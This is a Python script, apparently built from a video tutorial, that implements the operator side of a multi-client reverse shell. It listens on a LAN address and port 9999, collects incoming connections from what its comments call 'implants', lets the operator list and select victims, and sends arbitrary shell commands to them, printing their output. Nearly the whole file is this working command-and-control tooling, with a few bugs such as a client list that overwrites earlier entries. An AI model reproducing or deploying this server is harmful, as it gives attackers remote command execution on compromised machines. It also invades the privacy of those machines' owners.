#!/usr/bin/python3

#ref https://www.youtube.com/watch?v=Iu8_IpztiOU&list=PLhTjy8cBISErYuLZUvVOYsR1giva2payF&index=16

from re import T
import socket
import sys
import threading
import time
from queue import Queue


PORT = 9999
SERVER = "192.168.92.128"
ADDR = (SERVER, PORT)
FORMAT = 'utf-8'
BACKLOG = 5

NUMBER_OF_THREADS = 2

# Thread 1  job: listen for / accept connections.
# Thread 2 job :send commands to the client / handle existing connections.
JOB_NUMBER = [1, 2]
queue = Queue()

# Connection objects will be stored in this list.
all_connections = []
all_addresses = []

# Creates a socket.
def create_socket():
    try:
        global svr_socket
        # Creates socket.
        svr_socket = socket.socket()
    except socket.error as msg:
        print(f"Socket creation error: {msg}.\n")

# Binding the socket and listening for connections.
def bind_socket():
    try:
        global svr_socket

        print(f"Binding port: {PORT}.\n")

        svr_socket.bind(ADDR)
        svr_socket.listen(BACKLOG)
    except socket.error as msg:
        print(f"Socket binding error {msg}.\n Retrying...")
        # If socket bind fails, recursively call bind_socket()
        bind_socket()

# Thread one will execute the accepting_connections function.
# Handles connections from multiple clients.
# Closing previous connections when server.py file is restarted.

def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, addr = svr_socket.accept()
            svr_socket.setblocking(1)  # prevents timeout from happening.
            
            all_connections.append(conn)
            all_addresses.append(addr)
            print(f"Connection has been established: {addr[0]}")
        except:
            print("Error accepting_connection.")

# Thread 2 will the start_shell function.
# This function allows you to:
# Seel all clients, select a client, send commands to client.
# Interactive prompt for sending commands.
# Example of how to interact with shell:
# jshell> list
# 1 Conn-A Port
# 2 Conn-B Port
# jshell> select 1
# 192.168.0.112> dir

def start_shell():

    while True:
        cmd = input('jshell> ')
        # List all clients.
        if cmd == 'list':
            list_connections()
        
        # The user will type in which client to connect to,
        # which is passed to the get_targets function.
        elif 'select' in cmd:
            conn = get_targets(cmd)
            # If conn object exists, execute send_target_commands.
            if conn is not None:
                send_target_commands(conn)
        else:
            print("Command not recognized")

# Display all current active connections with the client
def list_connections():
    results = ''
    for i, conn in enumerate(all_connections):
        try:
            # Try to send every client something.
            conn.send(str.encode(' '))
            # If we cannot send and or dont receive anything, the except
            # statement will be hit. Indicating that client is not online.
            conn.recv(201480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        # results will be i (enumerate ID), ip address[i][0], and port[i][1] for each client.
        results = f" {str(i)}        {str(all_addresses[i][0])}  {str(all_addresses[i][1])}\n"
    print(f"----Clients----\n {results}")


def get_targets(cmd):
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print(f"You are now connected to {str(all_addresses[target][0])} ")
        print(f"{str(all_addresses[target][0])} > ", end="")
        return conn
    except:
        print("Selection not valid.")
        return None

# Send commands to implant.
def send_target_commands(conn):
    while True:
        try:
            cmd = input()
            if cmd == 'quit':
                break
            # Encode the command into byte format.
            # Obtain the length of the encoded string.
            # If the length is < 0, then we know the user has typed something
            # in.
            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                # Set recv buffer to 20480, decode byte to UTF-8, which then allows
                # us to convert the response into a string with str.
                client_response = str(conn.recv(20480), "utf-8")
                # End="" ensures that when typing a command, the terminal goes to
                # to the next line. Otherwise, input stacks up on the same line.
                print(client_response, end="")
        except:
            print("Error sending commands")
            break

# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()

# Selects / executes next job that is in queue.
# First thread handles connections
# Second thread handles sending / receiving commands.
def work():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()
        if x == 2:
            start_shell()
        
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


create_workers()
create_jobs()
